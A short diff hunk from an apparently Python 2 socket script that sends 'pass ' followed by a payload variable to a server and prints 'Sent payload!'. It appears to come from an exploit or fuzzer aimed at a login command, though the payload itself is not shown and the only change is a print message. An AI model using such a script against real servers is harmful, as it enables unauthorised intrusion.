@@ -145,7 +145,7 @@ while True:
 		s.recv(1024)
 		s.send(('pass ' + payload + '\r\n'))
 		if not s.recv(1024):	
-			print "No response"
+			print "No response ..."
 			break
 		print "Sent payload!"
 		s.close()
